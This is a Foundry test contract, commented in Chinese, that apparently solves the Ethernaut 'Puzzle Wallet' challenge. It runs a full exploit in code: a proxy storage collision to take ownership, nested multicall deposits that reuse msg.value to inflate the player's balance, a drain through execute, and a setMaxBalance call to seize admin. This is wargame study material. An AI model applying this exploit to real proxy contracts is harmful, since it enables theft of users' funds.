// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {PuzzleProxy, PuzzleWallet} from "../src/PuzzleWallet.sol";

/*
A call B delegatecall C delegatecall D

在D中，this的地址是B, msg.sender是A
*/


contract PuzzleWalletTest is Test {
    function testPuzzleWallet() public {
        PuzzleProxy proxy = PuzzleProxy(payable(0x3ABeda0255B72b65824988BfF29536F164753141));
        PuzzleWallet wallet = PuzzleWallet(address(proxy));

        address player = makeAddr("player");
        console.log("player %s", player);

        vm.deal(player, 1 ether);
        vm.startPrank(player, player);

        proxy.proposeNewAdmin(player);  // player是PuzzleWallet的owner
        wallet.addToWhitelist(player);  // 等价于address(proxy).call(abi.encodeWithSignature("addToWhitelist(address)", player))

        console.log("player whitelist %d", wallet.whitelisted(player));

        /*
        需要将proxy余额清零
        multicall中，分别调用两次multicall，每个multicall中调用一次deposit，msg.value=0.001 eth
        这样每次deposit中，msg.value=0.001 eth，但是balances[msg.sender]增加了两次
        */

        // 单次multicall中，调用deposit
        bytes[] memory deposit = new bytes[](1);
        deposit[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, deposit);
        data[1] = data[0];

        address(proxy).call{value: 0.001 ether}(abi.encodeWithSelector(PuzzleWallet.multicall.selector, data));

        uint256 balance = wallet.balances(player);
        console.log("player balance %d", balance);
        bytes memory executeData;

        wallet.execute(player, balance, executeData); // address(proxy).call(abi.encodeWithSignature("execute(address,uint256,bytes)", player, balance, executeData))

        console.log("wallet balance %d", address(wallet).balance);

        wallet.setMaxBalance(uint256(uint160(player)));

        vm.stopPrank();

        console.log(proxy.admin());
        console.log(proxy.pendingAdmin());
    }
}